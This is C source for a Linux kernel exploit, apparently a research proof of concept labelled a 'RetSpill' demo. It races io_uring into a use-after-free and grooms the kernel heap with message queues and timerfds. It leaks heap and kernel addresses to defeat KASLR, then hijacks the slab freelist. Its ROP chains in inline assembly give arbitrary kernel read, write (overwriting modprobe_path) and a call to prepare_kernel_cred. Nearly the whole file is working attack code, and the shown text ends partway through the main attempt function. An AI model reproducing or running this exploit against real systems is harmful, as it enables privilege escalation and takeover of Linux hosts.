#define _GNU_SOURCE 

#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <assert.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <x86intrin.h>

#include <linux/capability.h>
#include <linux/futex.h>
#include <linux/io_uring.h>

// io_uring tutorial: https://unixism.net/2020/04/io-uring-by-example-article-series/
#define u64 unsigned long long
#define u32 unsigned int
#ifndef __NR_io_uring_enter
#define __NR_io_uring_enter 426
#endif
#ifndef __NR_io_uring_setup
#define __NR_io_uring_setup 425
#endif

int fd_io_uring;
u64 kaslr_slide = 0;
u64 kernel_base = 0;
int mid_tfd = -1, upper_msgqid = -1, lower_msgqid = -1;
#define GROOM_NUM 0x20
char trigger_path[] = "/tmp/x";
char *path_ptr = trigger_path;
u64 prsp = 0xffffffff8106de70;
u64 pivot_target = 0xffffffff8278cc00;
u64 cpu_num = 4;
u64 work_num = 0x200;
char fname[] = "/etc/resolv.conf";
u64 heap_addr;
int target_shmid;
char timerfd_backup[0x100];
#define NAP_TIME 50000
#define CRASH_ADDR 0xffffffffdeadbeef
#define PIVOT_GADGET 0xffffffff81236c0b // : add rsp, 0xd0; pop rbx; pop r14; pop r15; pop rbp; ret;

void set_cpu(int cpuid)
{
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(cpuid, &my_set);
	assert(sched_setaffinity(0, sizeof(my_set), &my_set) == 0);
}

struct cq_ring_t {
	u32 *head;
	u32 *tail;
	u32 *ring_mask;
	u32 *ring_entries;
	struct io_uring_cqe *cqes;
};

struct sq_ring_t {
	u32 *head;
	u32 *tail;
	u32 *ring_mask;
	u32 *ring_entries;
	u32 *flags;
	u32 *array;
};

struct uring_mgr_t {
	int fd;
	struct sq_ring_t sq_ring;
	struct cq_ring_t cq_ring;
	struct io_uring_sqe *sqes;
};

#define IORING_OP_WRITE 23
#define IORING_OP_READ 22

struct uring_mgr_t mgr;
void uring_mgr_setup(struct uring_mgr_t *mgr, u32 entries)
{
	// create io_uring fd
	struct io_uring_params setup_params = {0};
	setup_params.flags = IORING_SETUP_IOPOLL;
	mgr->fd = syscall(__NR_io_uring_setup, entries, &setup_params);
	assert(mgr->fd >= 0);

	// map the ring buffer and the SQE(submission queue entry) buffer
	uint32_t sq_ring_sz = setup_params.sq_off.array + setup_params.sq_entries * sizeof(uint32_t);
	uint32_t cq_ring_sz = setup_params.cq_off.cqes + setup_params.cq_entries * sizeof(struct io_uring_cqe);
	uint32_t ring_sz = sq_ring_sz > cq_ring_sz ? sq_ring_sz : cq_ring_sz;
	uint32_t sqes_sz = setup_params.sq_entries * sizeof(struct io_uring_sqe);
	void *ring_ptr = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, mgr->fd, IORING_OFF_SQ_RING);
	mgr->sqes = mmap(NULL, sqes_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, mgr->fd, IORING_OFF_SQES);
	assert((long)mgr->sqes >= 0);

	// now initialize the completion queue
	struct cq_ring_t *cq_ring = &mgr->cq_ring;
	cq_ring->head = ring_ptr + setup_params.cq_off.head;
	cq_ring->tail = ring_ptr + setup_params.cq_off.tail;
	cq_ring->ring_mask = ring_ptr + setup_params.cq_off.ring_mask;
	cq_ring->ring_entries = ring_ptr + setup_params.cq_off.ring_entries;
	cq_ring->cqes = ring_ptr + setup_params.cq_off.cqes;

	// now initialize the submission queue
	struct sq_ring_t *sq_ring = &mgr->sq_ring;
	sq_ring->head = ring_ptr + setup_params.sq_off.head;
	sq_ring->tail = ring_ptr + setup_params.sq_off.tail;
	sq_ring->ring_mask = ring_ptr + setup_params.sq_off.ring_mask;
	sq_ring->ring_entries = ring_ptr + setup_params.sq_off.ring_entries;
	sq_ring->flags = ring_ptr + setup_params.sq_off.flags;
	sq_ring->array = ring_ptr + setup_params.sq_off.array;
}

void hex_print(void *addr, size_t len)
{
	u64 tmp_addr = (u64)addr;
	puts("");
	for(u64 tmp_addr=(u64)addr; tmp_addr < (u64)addr + len; tmp_addr += 0x10) {
		printf("0x%016llx: 0x%016llx 0x%016llx\n", tmp_addr, *(u64 *)tmp_addr, *(u64 *)(tmp_addr+8));
	}
}

#define barrier()  __asm__ __volatile__("":::"memory")

int *flag;
u64 val;
u64 *val_ptr = &val;
u64 elapse_time[2];
void *func(void *arg) {
	int cpuid = (int)(long)arg;
	set_cpu(cpuid);
	while(*flag == 0);
	// u64 start = current_time_micro();
	register u64 start = __rdtsc();
	int ret = syscall(__NR_io_uring_enter, fd_io_uring, work_num/2, work_num/2, 1);
	// u64 end = current_time_micro();
	register u64 end = __rdtsc();
	elapse_time[cpuid] = end-start;
	__atomic_fetch_add(&val, 1, __ATOMIC_SEQ_CST);
}

void trigger_free()
{
	// 199113 /etc/ssl/certs/ca-certificates.crt
	// 2601712 /node-boot/kdump/vmlinuz-5.10.19+
	// 28046896 /usr/lib/x86_64-linux-gnu/libicudata.so.66.1
	uring_mgr_setup(&mgr, work_num);
	fd_io_uring = mgr.fd;

	// open some file
	// fd = open("/etc/passwd", O_RDONLY|O_NONBLOCK|O_DIRECT|O_SYNC);
	int fds[work_num];
	for(int i=0; i<work_num; i++) {
		// fds[i] = open("/etc/resolv.conf", O_RDONLY|O_NONBLOCK|O_DIRECT|O_SYNC);
		fds[i] = open(fname, O_RDONLY|O_NONBLOCK|O_DIRECT|O_SYNC);
		assert(fds[i] >= 0);
	}
	printf("fd: %d\n", fds[0]);
	assert(fds[0] >= 0);

	// SQE: submission queue entries
	// struct io_uring_sqe sqe = {
	// 	.opcode = IORING_OP_WRITE,
	// 	.flags = 0,
	// 	.ioprio = 0,
	// 	.fd = fd,
	// 	.off = 0,
	// 	.addr = 0,
	// 	.len = 1,
	// };
	void *buf = mmap(NULL, 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
	memset(buf, 'A', 0x5000000);

	struct io_uring_sqe sqe = {
		.opcode = IORING_OP_READ,
		.flags = 0,
		.ioprio = 0,
		.fd = -1,
		.off = 0,
		.addr = (u64)buf,
		.len = 0x5000000,
	};

	// now submit the request
	struct sq_ring_t *sq_ring = &mgr.sq_ring;
	struct cq_ring_t *cq_ring = &mgr.cq_ring;
	u32 index, tail, next_tail;
	next_tail = tail = *sq_ring->tail;
	next_tail++;
	barrier();
	// copy the request to the sqe buffer
	index = tail & *mgr.sq_ring.ring_mask;
	for(int i=0; i<work_num; i++) {
		sqe.fd = fds[i];
		memcpy(&mgr.sqes[index+i], &sqe, sizeof(struct io_uring_sqe));
	}
	
	sq_ring->array[index] = index;
	tail = next_tail;
	assert(*sq_ring->tail != tail);
	*sq_ring->tail = work_num;

	// heap grooming
	char buffer[0x2000];
	for(int i=0; i<2; i++) {
		int msgqids[0x100];
		memset(buffer, 0x41+i, sizeof(buffer));// taint msgq
		// safe allocate
		set_cpu(2);
		for(int j=0; j<0x100; j++) msgqids[j] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT); 

		set_cpu(i);
		for(int j=0; j<0x100; j++) {
			assert(msgsnd(msgqids[j], buffer, 0x1000+0xf0-0x30, IPC_NOWAIT) >= 0);
			if(j % 8 == 0) msgrcv(msgqids[j], buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		}
	}

	set_cpu(2);

	pthread_t tids[2];
	int ret;
	for(int i=0; i<2; i++) {
		ret = pthread_create(&tids[i], NULL, func, (void *)(long)i);
		assert(ret == 0);
	}
	*flag = 1;
	sleep(1);
	while(*val_ptr != 2);
	pthread_join(tids[0], NULL);
	pthread_join(tids[1], NULL);
	printf("diff: %#x\n", abs(elapse_time[1]-elapse_time[0]));

	// sleep(1000);
	execve("/", NULL, NULL);
	close(fd_io_uring);
	for(int i=0; i<2; i++) {
		memset(buffer, 0x41+i, sizeof(buffer));// taint msgq
		set_cpu(i);
		// defragment(0x1100-0x30-0x10, 0x100);
		int msgqids[0x100];
		// safe allocate
		set_cpu(2);
		for(int j=0; j<0x100; j++) msgqids[j] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT); 

		set_cpu(i);
		for(int j=0; j<0x100; j++) {
			assert(msgsnd(msgqids[j], buffer, 0x1000+0xf0-0x30, IPC_NOWAIT) >= 0);
			if(j % 8 == 0) msgrcv(msgqids[j], buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		}
	}
	exit(0);
}

void cleanup_msgs(void)
{
	int msgqid;
	struct msqid_ds ds;
	struct msginfo msginfo;
	int maxind = msgctl(0, MSG_INFO, (struct msqid_ds *) &msginfo);
	assert(maxind >= 0);

	printf("cleanup %d msgs\n", maxind);

	for(int i=0; i<maxind; i++) {
		int ret;
		msgqid = msgctl(i, MSG_STAT, &ds);
		assert(msgqid >= 0);
		ret = msgctl(msgqid, IPC_RMID, 0);
		assert(ret >= 0);
	}
}

void cleanup_msgs_in_cpu(int cpuid)
{
	set_cpu(cpuid);

	int msgqid;
	struct msqid_ds ds;
	struct msginfo msginfo;
	int maxind = msgctl(0, MSG_INFO, (struct msqid_ds *) &msginfo);
	char buffer[0x2000];
	assert(maxind >= 0);

	printf("cleanup %d msgs\n", maxind);


	for(int i=0; i<maxind; i++) {
		int ret;
		msgqid = msgctl(i, MSG_STAT, &ds);
		assert(msgqid >= 0);
		ret = msgrcv(msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		// only clear messages in at CPU
		if(buffer[0] == 0x41+cpuid) {
			ret = msgctl(msgqid, IPC_RMID, 0);
			assert(ret >= 0);
		}
	}
}

int obj_cpuid = -1;
int check_trigger()
{
	int msgqid;
	struct msqid_ds ds;
	struct msginfo msginfo;
	int maxind = msgctl(0, MSG_INFO, (struct msqid_ds *) &msginfo);
	assert(maxind >= 0);

	char buffer[0x2000];
	char payload1[0x2000];
	char payload2[0x2000];
	memset(payload1, 'A', sizeof(payload1));
	memset(payload2, 'B', sizeof(payload2));

	// printf("check %d msgs\n", maxind);

	for(int i=0; i<maxind; i++) {
		int ret;
		msgqid = msgctl(i, MSG_STAT, &ds);
		assert(msgqid >= 0);
		for(int j=0; j<ds.msg_qnum; j++) {
			ret = msgrcv(msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
			assert(ret >= 0);
			if(memcmp(buffer, payload1, 0x10a0) && memcmp(buffer, payload2, 0x10a0)) {
				// hex_print(buffer, 0x10a0);
				u64 magic = *(u64 *)&buffer[0xfe0];
				// printf("cpu taint: %llx\n", magic);
				obj_cpuid = buffer[0] - 0x41;
				return msgqid;
			}
			msgrcv(msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		}
	}
	exit(0);
}

#define SPRAY_MAX 0x40
int msgqids2[4][SPRAY_MAX];
int _search_for_victim(int cpuid)
{
	char buffer[0x2000];
	int tfd;
	int ret;

	memset(buffer, 'C', 0x10);
	memset(&buffer[0x10], '\x80', 0x1000);

	set_cpu(cpuid);
	for(int i=0; i<SPRAY_MAX; i++) {
		// int msgqid = msgqids2[cpuid][i];
		// memset(buffer, 'C', sizeof(buffer));
		// assert(msgsnd(msgqid, buffer, 0x1100-0x30-0x10, IPC_NOWAIT) >= 0);

		// overwrite the mid object
		tfd = timerfd_create(CLOCK_REALTIME, 0);
		// close(tfd);

		ret = msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		assert(ret >= 0);
		u64 magic = *(u64 *)&buffer[0x1040];
		// hex_print(&buffer[0xfe0], 0xa0);
		// printf("magic: %#llx\n", magic);
		//
		if(magic == 0xdead4ead00000000) {
			obj_cpuid = cpuid;
			// mid_tfd = timerfd_create(CLOCK_REALTIME, 0);
			mid_tfd = tfd;
			int msgqid = msgqids2[cpuid][i];
			// iron out the weird freelist
			for(int i=0; i<0x10; i++) assert(msgsnd(msgqid, buffer, 0xc1-0x30, IPC_NOWAIT) >= 0);
			heap_addr = *(u64 *)&buffer[0x1000] - 0x130;
			printf("mid_tfd: %d, upper_msgqid: %d\n", mid_tfd, upper_msgqid);
			assert(mid_tfd >= 0);
			return 1;
		}
	}

	return 0;
}

void increase_limit()
{
	int ret;
	struct rlimit open_file_limit;
	
	/* Query current soft/hard value */
	ret = getrlimit(RLIMIT_NOFILE, &open_file_limit);
	assert(ret >= 0);
	
	/* Set soft limit to hard limit */
	open_file_limit.rlim_cur = open_file_limit.rlim_max;
	ret = setrlimit(RLIMIT_NOFILE, &open_file_limit);
	assert(ret >= 0);
}

void search_for_victim()
{
	int found = 0;
	// printf("obj_cpuid: %d\n", obj_cpuid);
	// now try to find the victim object in all CPUs
	for(int i=0; i<2; i++) {
		found = _search_for_victim(i % cpu_num);
		if(found == 1) break;
	}
	if(!found) {
		puts("Fail to find the victim object in all CPUs, press enter to crash!");
		// getchar();
		exit(-1);
	}
}

void leak_heap_addr()
{
	// we found everything! now leak heap address!
    char buffer[0x2000];
    memset(buffer, 0, sizeof(buffer));
    msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	// hex_print(&buffer[0xfe0], 0x100);
    heap_addr = *(u64 *)&buffer[0x1000] - 0x130;
	if((heap_addr & 0xff) != 0) {
		puts("Fail to leak heap address, press Enter to crash!");
		// getchar();
		exit(-1);
	}
}

void func2() {
	set_cpu(2);
	char buffer[0x2000];
	printf("cpu: %d\n", sched_getcpu());
	msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
}

void search_slab() {
	int shmfds[0x400];
	memset(shmfds, 0, sizeof(shmfds));
	int slab_found = 0;
	char buffer[0x2000];
	// set_cpu(obj_cpuid);
    for(int j=0; j<0x400; j++) {
		u64 tmp_hash;
		shmfds[j] = shmget(IPC_PRIVATE, 1, 0600);
		// shmfds[i][j] = timerfd_create(CLOCK_REALTIME, 0); //////////////////////////////////////////////////
		// shmfds[i][j] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT); //////////////////////////////////////////////////
		// printf("fd: %d\n", shmfds[j]);
		// set_cpu(3);
    	msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		// set_cpu((obj_cpuid+i)%cpu_num);
		tmp_hash = *(u64 *)&buffer[0xfe0];
		// memset(buffer, 'C', sizeof(buffer));
		// printf("hash: %#lx\n", tmp_hash);
		// printf("magic: %#lx\n", *(u64 *)&buffer[0xfe0]);
		if((tmp_hash >> 48) == 0xffff) {
			// puts("Found the Slab!");
			slab_found = 1;
			target_shmid = shmfds[j];
			// hex_print(&buffer[0xfe0], 0xa0);
			// obj_cpuid = i;
			break;
		}
	}
	if(!slab_found) {
		puts("Failed to find the target slab, press Enter to crash");
		// getchar();
		exit(-1);
	}
}

int _read64_1(void *arg_arg)
{
	u64 *arg = (u64 *)arg_arg;
	u64 val;
	u64 addr = arg[0];
    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov r15, 0x4141414141414141;"
            "mov r14, 0x4242424242424242;"
            "mov r13, 0x4343434343434343;"
            "mov r12, 0x4444444444444444;"
            "mov r10, 0x4646464646464646;"
            "mov r8, 0x4747474747474747;"
            "mov r9, 0x4848484848484848;"
            "mov rbp, 0x4545454545454545;"
            "mov rbx, 0x4040404040404040;"

            "mov r15, 0xffffffff8105daea;" // : pop rsi; pop rdx; pop rcx; ret;
            "add r15, kaslr_slide;"
            "mov r14, 0;"
            "mov r13, %1;"
            "mov r12, 0x41414141;" // this is supposed to be the return address, put a place holder here
            "mov rbp, 0xffffffff81038dbc;" // pop r11; pop rbp; ret;
            "add rbp, kaslr_slide;"
            "mov rbx, 0x246;"
            "nop;" 
            "mov r10, 0xffffffff811b273f;" //: mov rax, [rdx+0x10]; ret;
            "add r10, kaslr_slide;"
            "mov r9, 0xffffffff813e005e;" //: xchg rbp, rax; ret;
            "add r9, kaslr_slide;"
            "mov r8, 0xffffffff81e000f2;"
            "add r8, kaslr_slide;"

            "mov rdi, path_ptr;"
            "mov rsi, 0;"
            "mov rdx, 0;"
            "mov rax, 0x3b;"
            "lea r12, [rip+2];" // force it to return right after the syscall instruction
            "syscall;"
            "mov %0, rbp;"
            "pop rbp;"
            ".att_syntax;"
            : "=r"(val) : "r"(addr-0x10));
	arg[0] = val;
	// printf("val inside thread: %#llx\n", val);
	sleep(100000);
}

u64 read64_1(u64 addr)
{
	u64 arg[1];
	arg[0] = addr;
	void *child_stack = malloc(8000);
	int child = clone(_read64_1, child_stack + 8000, CLONE_FILES | CLONE_VM, arg);
	while(arg[0] == addr) usleep(NAP_TIME);
	return arg[0];
}

int _write64(void *arg_arg)
{
	// this function calls do task dead, it will never return
	u64 *arg = (u64 *)arg_arg;
	u64 addr = arg[0];
	u64 val = arg[1];
    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov r15, 0x4141414141414141;"
            "mov r14, 0x4242424242424242;"
            "mov r13, 0x4343434343434343;"
            "mov r12, 0x4444444444444444;"
            "mov r10, 0x4646464646464646;"
            "mov r8, 0x4747474747474747;"
            "mov r9, 0x4848484848484848;"
            "mov rbp, 0x4545454545454545;"
            "mov rbx, 0x4040404040404040;"

            "mov r15, 0xffffffff8105daea;" // : pop rsi; pop rdx; pop rcx; ret;
            "add r15, kaslr_slide;"
            "mov r14, %0;" // address
            "mov r13, 0;"
            "mov r12, %1;" // value
            "mov rbp, 0xffffffff819ffc16;" //: mov [rsi], rcx; mov al, 1; ret;
            "add rbp, kaslr_slide;"
            "mov rbx, 0xffffffff811136b0;" // do_task_dead
            "add rbx, kaslr_slide;"
            "nop;" 

            "mov rdi, path_ptr;"
            "mov rsi, 0;"
            "mov rdx, 0;"
            "mov rax, 0x3b;"
            "syscall;"
            "pop rbp;"
            ".att_syntax;"
            : : "r"(addr), "r"(val));
	arg[0] = 0x41414141;
	while(1);
}

void write64(u64 addr, u64 val)
{
	u64 arg[2];
	arg[0] = addr;
	arg[1] = val;
	void *child_stack = malloc(8000);
	int child = clone(_write64, child_stack + 8000, CLONE_FILES | CLONE_VM, arg);
	sleep(1);
	// while(arg[0] == addr);
	// puts("write done!");
}

u64 func_call()
{
	u64 val;
    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov r15, 0x4141414141414141;"
            "mov r14, 0x4242424242424242;"
            "mov r13, 0x4343434343434343;"
            "mov r12, 0x4444444444444444;"
            "mov r10, 0x4646464646464646;"
            "mov r8, 0x4747474747474747;"
            "mov r9, 0x4848484848484848;"
            "mov rbp, 0x4545454545454545;"
            "mov rbx, 0x4040404040404040;"

            "mov r15, 0xffffffff810005c0;" //: pop rdi; ret;
            "add r15, kaslr_slide;"
            "mov r14, 0;"
            "mov r13, 0xffffffff8110af80;" // prepare_kernel_cred
            "add r13, kaslr_slide;"
            "mov r12, 0xffffffff813e005e;" //: xchg rbp, rax; ret;
            "add r12, kaslr_slide;"
            "mov rbp, 0xffffffff8165692c;" // pop r11; pop r14; ret;
            "add rbp, kaslr_slide;"
            "mov rbx, 0x246;"
            "nop;" 

            "mov r10, 0xffffffff81014c66;" // : pop rcx; ret;
            "add r10, kaslr_slide;"
            "mov r9, 0x41414141;" // this is the return address, put a place holder here
            "mov r8, 0xffffffff81e000f2;"
            "add r8, kaslr_slide;"

            "mov rdi, path_ptr;"
            "mov rsi, 0;"
            "mov rdx, 0;"
            "mov rax, 0x3b;"
            "lea r9, [rip+2];" // force it to return right after the syscall instruction
            "syscall;"
            "mov %0, rbp;"
            "pop rbp;"
            ".att_syntax;"
            : "=r"(val));
	return val;
}

void RetSpill_demo()
{
	puts("=====================================");
	puts("CFHP is obtained!");
	puts("Now press Enter to start the demo for RetSpill!!");
	getchar();

	u64 leak_addr = kaslr_slide + 0xffffffff82e1cc88;

	// read from kernel: set a register and return back to userspace
	puts("\n[*] Experiment 1: Arbitrary read");
	printf("[*] read 8 bytes from %#llx (init_task->comm)...\n", leak_addr);
	u64 leak1 = read64_1(leak_addr);
	puts("[+] done!");
	char leak1_s[10];
	memset(leak1_s, 0, sizeof(leak1_s));
	*(u64 *)leak1_s = leak1;
	printf("[+] data at %#llx is %#llx ('%s')\n", leak_addr, leak1, leak1_s);

	// write to kernel: use write gadget and then do_task_dead
	u64 write_addr = kaslr_slide + 0xffffffff82e5bbd0;
	u64 write_val = 0x4141414141414141;
	int fd;
	char tmp_buf[0x20] = {0};
	puts("\n[*] Experiment 2: Arbitrary write");
	printf("[*] write %#llx to %#llx (modprobe_path)...\n", write_val, write_addr);
	fd = open("/proc/sys/kernel/modprobe", 0);
	read(fd, tmp_buf, 0x20);
	close(fd);
	printf("[*] what's currently in modprobe_path: %s\n", tmp_buf);
	write64(write_addr, write_val); // overwrite modprobe_path
	puts("[+] done!");
	fd = open("/proc/sys/kernel/modprobe", 0);
	read(fd, tmp_buf, 0x20);
	close(fd);
	printf("[+] now the new modprobe_path is: %s\n", tmp_buf);

	// call prepare_kernel_cred(NULL) and get back its return value
	puts("[*] Experiment 3: Arbitrary function call");
	puts("[*] invoking prepare_cred(NULL)...");
	u64 kret = func_call();
	puts("[+] done!");
	printf("[+] prepare_cred(NULL) returns: %#llx\n", kret);

	puts("=====================================");
	puts("domo for RetSpill finishes, press ctrl+c to kill QEMU");
	while(1);
}

void check_cfhp()
{
	// weirdly, sometimes misc_format->load_binary will not be triggered, thus no CFHP
	// let's make sure we have it before doing RetSpill eval

	u64 leak_addr = kaslr_slide + 0xffffffff82e5bbd0; // modprobe_path
	u64 leak = read64_1(leak_addr);
	if(leak != 0x6f6d2f6e6962732f) { // /sbin/mo
		puts("Fail to obtain CFHP, plz try it again!");
		while(1);
	}
}

void busy_sleep(int seconds)
{
	struct timeval ts = {0};
	gettimeofday(&ts, NULL);
	time_t start = ts.tv_sec;
	time_t now;

	do {
		gettimeofday(&ts, NULL);
		now = ts.tv_sec;
	} while(now - start <= seconds);
	return;
}

void attempt()
{
	puts("\n\n============= New Race Attempt =============");
	cleanup_msgs();
	sleep(1);

	// allocate message queues for later spray
	for(int cpuid=0; cpuid<4; cpuid++) {
		for(int i=0; i<SPRAY_MAX; i++) msgqids2[cpuid][i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	}

	flag = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, -1, 0);
	if(!fork()) {
		trigger_free(); // no return
	} else {
		set_cpu(2); ////////// maybe try to occupy the CPU here?
		wait(NULL);
		int found = 0;
		lower_msgqid = check_trigger();
		assert(obj_cpuid != -1);
		puts("[+] Found the lower msg!");
		printf("[+] Victim @ CPU %d\n", obj_cpuid);

		// // cleanup messages in the other CPU to save some fds
		// cleanup_msgs_in_cpu(1-obj_cpuid);
		// sleep(1);

		search_for_victim();
		// puts("[+] Found the victim object!");
		puts("[+] Found mid tfd!");
    	printf("[+] heap_addr: %#llx\n", heap_addr);

		// now defragment the slab so that once we free it, we know the hash means NULL
		puts("Do defrag");
		// set_cpu(obj_cpuid);
        for(int i=0; i<0x40; i++) timerfd_create(CLOCK_REALTIME, 0);
		int padding_msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		int payload_msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		puts("Defragment Done!");

		char buffer[0x2000];

		// leak NULL hash
		// printf("mid_tfd: %d\n", mid_tfd);
		// getchar();
		close(mid_tfd);
		usleep(NAP_TIME);
		// getchar();
		// set_cpu(3);
        msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		// set_cpu(obj_cpuid);
		// hex_print(&buffer[0xfe0], 0xa0);
        u64 null_hash = *(u64 *)&buffer[0xfe0];
		u64 null_hash2 = null_hash ^ 0x8000000000000000; // null hash is address-dependent
		u64 null_hash3 = null_hash ^ 0xb000000000000000; // null hash is address-dependent
		printf("NULL hash: %#llx\n", null_hash);
		printf("NULL hash 2: %#llx\n", null_hash2);
		printf("NULL hash 3: %#llx\n", null_hash3);
		// memset(buffer, 'C', sizeof(buffer));
		// getchar();

		// search for the slab because it can be reused by other CPUs
		search_slab();

		// now free the shmfd
		shmctl(target_shmid, IPC_RMID, NULL);

		// hijack freelist once the free happens
		while(1) {
        	msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
			if(*(u64 *)&buffer[0xfe0] != 0) break;
		}
        msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		*(u64 *)&buffer[0xfd0+0x10] = null_hash ^ (heap_addr+0x110);
		*(u64 *)&buffer[0xfd0+0x90] = null_hash2 ^ (heap_addr+0x120);
        msgsnd(lower_msgqid, buffer, 0x1000+0x100-0x30-0x20, IPC_NOWAIT);

		// allocate a shmid to occupy the slot
		int mid_shmid = shmget(IPC_PRIVATE, 1, 0600);

		// allocate another message to completely overlap with lower msgqid
		// memset(buffer, 'C', 0x2000);
		*(u64 *)&buffer[0xfd0+0xa0-0x10] = null_hash3;
        msgsnd(padding_msgqid, buffer, 0x1000+0x100-0x30-0x20, IPC_NOWAIT);

		// allocate a timerfd so it overlaps with the lower msg
		// set_cpu(obj_cpuid);
        int lower_tfd = timerfd_create(CLOCK_REALTIME, 0);
		struct itimerspec timespec = {{10000, 0}, {10000, 0}};
        timerfd_settime(lower_tfd, 0, &timespec, 0);
        msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		// hex_print(&buffer[0xfe0], 0x100);
		u64 kptr = *(u64 *)&buffer[0x1018];
		kernel_base = kptr - (0xffffffff8137b7a0 - 0xffffffff81000000); // *REMOTE*
        kaslr_slide = kernel_base - 0xffffffff81000000;
        printf("kptr: %#llx\n", kptr);
        printf("kernel_base: %#llx\n", kernel_base);
        printf("kaslr_slide: %#llx\n", kaslr_slide);
        // assert((kernel_base & 0xfff) == 0);
        // assert((kaslr_slide & 0xfff) == 0);
        pivot_target += kaslr_slide;
        prsp += kaslr_slide;

		memcpy(timerfd_backup, &buffer[0xff0], 0x100);
		// hex_print(timerfd_backup, 0x100);
		// puts("Backup");
		// getchar();

		// now the heap is stable do some prep
		int msgqids[0x100];
		for(int i=0; i<0x100; i++) {
			msgqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT); 
		}

		// prepare rop chain
        char rop_buf[0x2000];
        memset(rop_buf, 'A', sizeof(rop_buf));

		// getchar();
		// sleep for a while just in case of those cgroup BS
		sleep(1);

		// now free the padding message and do defragmentation until we see it got occupied in lower_msgqid
        msgrcv(padding_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		int found2 = 0;
		for(int i=0; i<0x100; i++) {
			int msgqid = msgqids[i];
			for(int j=0; j<0x8; j++) {
				*(u64 *)&buffer[0xfd8] = 0x4343434343434343;
				msgsnd(msgqid, buffer, 0x1000+0xd0-0x30, IPC_NOWAIT);
        		msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
				if(*(u64 *)&buffer[0xfe8] == 0x4343434343434343) {
					found2 = 1;
					// printf("pading: %d, padding: %d\n", padding_msgqid, msgqid);
					padding_msgqid = msgqid;
					break;
				}
			}
			if(found2) break;
		}
		if(!found2) {
			puts("Fail to find the overlapped message, press any key to abort");
			// getchar();
			exit(-1);
		}

		// now we hit the overlapped message, hijack freelist and overwrite load_misc_binary
        int ret = msgrcv(padding_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
        ret = msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		// *(u64 *)&buffer[0xfe0+0x80] = null_hash2 ^ (0xffffffff82f907c8 + kaslr_slide);
		*(u64 *)&buffer[0xfe0+0x80] = null_hash2 ^ (0xffffffff82f906b0+ kaslr_slide);
		ret = msgsnd(lower_msgqid, buffer, 0x1000+0xd0-0x30, IPC_NOWAIT);
		memmove(&buffer[0xfc0], &buffer[0xfe0], 0x100);
		// memset(&buffer[0xfd0], 'A', 0x40);
		msgsnd(padding_msgqid, buffer, 0x1000+0xd0-0x30, IPC_NOWAIT);
		memset(rop_buf, 'A', sizeof(rop_buf));
		*(u64 *)&rop_buf[0x1000-0x28] = kaslr_slide + PIVOT_GADGET;
		ret = msgsnd(payload_msgqid, rop_buf, 0x1000+0x100-0x30-0x20, IPC_NOWAIT); // overwrite load_misc_binary

		// now fix timerfd
        ret = msgrcv(padding_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
        ret = msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
        *(u64 *)&buffer[0xfe0+0x80] = null_hash2^(heap_addr+0x120);
        // memmove(&buffer[0xfd0], &buffer[0xfe0], 0x100);
        ret = msgsnd(lower_msgqid, buffer, 0x1000+0xd0-0x30, IPC_NOWAIT);
		msgsnd(padding_msgqid, buffer, 0x1000+0xd0-0x30, IPC_NOWAIT);
